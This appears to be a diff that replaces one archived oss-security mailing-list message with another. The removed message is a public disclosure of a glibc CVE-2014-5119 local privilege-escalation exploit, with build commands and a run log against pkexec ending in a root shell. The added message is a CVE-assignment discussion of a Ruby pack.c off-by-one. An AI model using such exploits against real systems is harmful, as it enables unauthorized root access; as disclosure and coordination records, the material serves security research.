@@ -1,76 +1,97 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/08/26/2
-Message-ID: <CAJ_zFk+bKENpjHtgf63Kick8SM_sTo0RWTjo1MVejtTgU5RV4g@mail.gmail.com>
-Date: Mon, 25 Aug 2014 19:00:15 -0700
-From: Tavis Ormandy <taviso@...gle.com>
-To: fulldisclosure@...lists.org, oss-security@...ts.openwall.com
-Subject: CVE-2014-5119 glibc __gconv_translit_find() exploit
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/07/15/3
+Message-ID: <73FD1A5A-F226-43F2-B9F0-6875CDBB252E@vmware.com>
+Date: Tue, 15 Jul 2014 15:10:05 +0000
+From: Ramon de C Valle <rdecvalle@...are.com>
+To: "cve-assign@...re.org" <cve-assign@...re.org>
+CC: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>, "thoger@...hat.com" <thoger@...hat.com>, "mmcallis@...hat.com" <mmcallis@...hat.com>
+Subject: Re: [ruby-core:63604] [ruby-trunk - Bug #10019] [Open] segmentation fault/buffer overrun in pack.c (encodes)
 Content-Type: text/plain; charset=utf-8
 
-List, back in July, I described CVE-2014-5119, a fiendish single-fixed-byte
-heap metadata overflow in the glibc internal routine
-__gconv_translit_find().
 
-This is caused by the file extension being incorrectly appended to the
-transliteration module filename. The result is one too few bytes are
-allocated, and a single nul byte is written out of bounds. This issue
-affects real programs, that are typically default installed and setuid root.
+On Jul 15, 2014, at 2:09 AM, cve-assign@...re.org wrote:
 
-Despite explaining that my research suggests this is exploitable, it
-appears there has been general skepticism that single-fixed-byte overflows
-are still exploitable with modern allocator metadata hardening.
+> Signed PGP part
+> > Is MITRE or Red Hat going to assign a CVE for it?
+> 
+> We haven't yet been able to determine whether the discussion is about
+> two separate vulnerabilities.
+> 
+> http://openwall.com/lists/oss-security/2014/07/09/13 says:
+> 
+>   ruby -v: ruby 2.1.2p168 (2014-07-06 revision 46721) [i386-mingw32]
+> 
+>   ...
+> 
+>   While working with an AWS sample I hit a segmentation fault. The
+>   same sample works under 1.9.3.
+> 
+> First, we don't know what "The same sample works under 1.9.3" means.
+> It might mean "The same AWS sample is also a working vulnerability
+> reproducer when using Ruby 1.9.3." It might instead mean "With this
+> AWS sample, my program works normally when using Ruby 1.9.3; in other
+> words, no vulnerability is observed.”
+It meant that his sample worked normally when he used Ruby 1.9.3. (I assumed this because the version he specified as containing the bug in the report was Ruby 2.1, and specified Ruby 2.0 as requiring backport, but not Ruby 1.9.3.)
 
-As a result, the issue has been largely dismissed and downgraded in
-severity. As little progress has been made in resolving the issue thus far,
-we're publishing a proof of concept today. This exploit is specific to
-Fedora 20 32-bit, but the issue is not specific to Fedora, and exploitation
-on other systems and platforms is possible.
+> 
+> http://openwall.com/lists/oss-security/2014/07/10/15 says:
+> 
+>   Anyway, whatever the reporter is referring to, he mentions it
+>   doesn't occur in 1.9.3, and looking at 1.9.3, the only related
+>   differences I immediately noticed are the absence of the check at
+>   https://github.com/ruby/ruby/blob/trunk/pack.c#L829 in pack_pack
+>   function and padding being an int (instead of char) in the encodes
+>   function.
+> 
+> These differences in pack.c obviously aren't the same as (and
+> aren't expected to be the same as) the pack.c code changes in
+> Revision 46778 (aka the
+> https://bugs.ruby-lang.org/projects/ruby-trunk/repository/revisions/46778/diff/pack.c
+> changes).
+These are the differences I noticed when comparing the related code in Ruby 1.9.3 (where his sample worked normally) with Ruby 2.0 and 2.1, but are not related to the (off-by-one) initially discussed, as it may be the case the reporter may be referring to a different issue, since Tomas analysis of aws-sdk gem and its dependencies indicates it's unlikely this issue is being caused by any of these gems.
 
-This issue is complex, and fiendishly difficult to exploit. Thanks to Chris
-Evans for his heap expertise and insight. Some more information is
-available on our team blog.
+> 
+> (We realize that 1.9.3 is of interest because it is the "Old stable"
+> distribution advertised on the
+> https://www.ruby-lang.org/en/downloads/ page.)
+> 
+> Is one of these scenarios the correct interpretation?
+> 
+>   1. There is only one vulnerability. Version 2.1.2 is an example of
+>      an affected version. Version 1.9.3 is an example of a
+>      non-affected version.
+> 
+>   2. There is only one vulnerability. Version 2.1.2 is an example of
+>      an affected version. Version 1.9.3 is also an example of an
+>      affected version.
+> 
+>   3. A vulnerability in pack.c was fixed during Ruby 1.x development,
+>      but then a regression occurred during Ruby 2.x development, and
+>      the vulnerability is present in, for example, version 2.1.2.
+>      (A regression would generally mean that two CVE IDs are
+>      required.)
+> 
+>   4. The Ruby 1.x pack.c and the Ruby 2.x pack.c are vulnerable in
+>      substantially different ways, requiring different fixes.
+>      (Again, this would generally mean that two CVE IDs are
+>      required.)
+> 
+> We don't require that the set of affected versions is precisely
+> determined before a CVE assignment. Narrowing it down to one of the
+> above scenarios is probably required because otherwise the correct
+> number of CVE IDs isn't known.
+Ruby 1.9.3, 2.0, and 2.1 are affected by the off-by-one. We’re still not sure about the presence of a different issue affecting Ruby 2.0 and 2.1. I left a comment on the report pointing out that 1.9.3 is also affected by the off-by-one and suggesting confirming with the reporter if he continues to observe the crash after adding the fix.
 
-http://googleprojectzero.blogspot.com/2014/08/the-poisoned-nul-byte-2014-edition.html
+> 
+> --
+> CVE assignment team, MITRE CVE Numbering Authority
+> M/S M300
+> 202 Burlington Road, Bedford, MA 01730 USA
+> [ PGP key available through http://cve.mitre.org/cve/request_id.html ]
+> 
+--
+Ramon de C Valle
+VMware Product Security Engineering
 
-$ make clean
-rm -f pkexploit pty *.o a.out *.so
-[taviso@...alhost glibc]$ make
-cc -ggdb3 -O0 -Wno-multichar -std=gnu99 -D_OPEN_TRANSLIT_OFF=0x00023320
--ldl  pkexploit.c   -o pkexploit
-cc -ggdb3 -O0 -Wno-multichar -std=gnu99 -D_OPEN_TRANSLIT_OFF=0x00023320
--ldl  pty.c   -o pty
-cc -ggdb3 -O0 -Wno-multichar -std=gnu99 -D_OPEN_TRANSLIT_OFF=0x00023320  -c
--o exploit.o exploit.c
-cc exploit.o -fPIC -shared -o exploit.so
-Execute pkexploit to attempt exploitation.
-[taviso@...alhost glibc]$ ./pkexploit
-[*] ---------------------------------------------------
-[*] CVE-2014-5119 glibc __gconv_translit_find() exploit
-[*] ------------------------ taviso & scarybeasts -----
-[*] Attempting to invoke pseudo-pty helper (this will take a few seconds)...
-[*] Read 7295 bytes of output from pseudo-pty helper, parsing...
-[*] pseudo-pty helper succeeded
-[*] attempting to parse libc fatal error message...
-[*] discovered chunk pointer from `corrupted double-lin...`, => 0x507e3658
-[*] attempting to parse the libc maps dump...
-[*] found libc.so mapped @0x40215000
-[*] expecting libc.so bss to begin at 0x406c7000
-[*] successfully located first morecore chunk w/tag @0x407d6000
-[*] allocating space for argument structure...
-[*] creating command string...
-[*] creating a tls_dtor_list node...
-[*] open_translit() symbol will be at 0x40238320
-[*] offsetof(struct known_trans, fname) => 32
-[*] appending `./exploit.so` to list node
-[*] building parameter list...
-[*] anticipating tls_dtor_list to be at 0x406c82d4
-[*] execvpe(pkexec...)...
-Error accessing / : File name too long
-uid=0(root) gid=1000(taviso) groups=0(root),10(wheel),1000(taviso)
-context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
-sh-4.2# exit
-exit
 
-Content of type "text/html" skipped
-
-Download attachment "CVE-2014-5119.tar.gz" of type "application/x-gzip" (6066 bytes)
+Download attachment "signature.asc" of type "application/pgp-signature" (843 bytes)
